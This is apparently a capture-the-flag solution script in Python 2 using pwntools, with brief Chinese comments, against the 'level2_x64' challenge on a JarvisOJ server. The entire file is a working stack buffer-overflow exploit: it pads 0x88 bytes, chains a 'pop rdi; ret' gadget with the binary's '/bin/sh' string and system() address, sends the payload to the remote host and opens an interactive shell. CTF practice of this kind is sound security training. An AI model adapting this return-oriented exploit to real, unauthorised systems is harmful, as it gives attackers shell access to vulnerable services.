#encoding:utf-8
#知识点  
#     长度 0x80 + 寄存器长度 8（leave）
#   gadget pop rdi; ret;
#   system 和 /bin/sh在程序中 调用方法获取 结果为int
from pwn import *
sou = ELF("./level2_x64")
addr_bin = sou.search("/bin/sh").next()
addr_sys = sou.symbols["system"]
addr_pr   = 0x0004006b3
print "addr_bin : 0x%x" %addr_bin
print "addr_sys : 0x%x" %addr_sys
padding = (0x80 + 8) * 'a'
payload = padding + p64(addr_pr) + p64(addr_bin) + p64(addr_sys)
# p = process("./level2_x64")

p = remote("pwn2.jarvisoj.com" ,  9882)

p.recv()
p.send(payload)

p.interactive()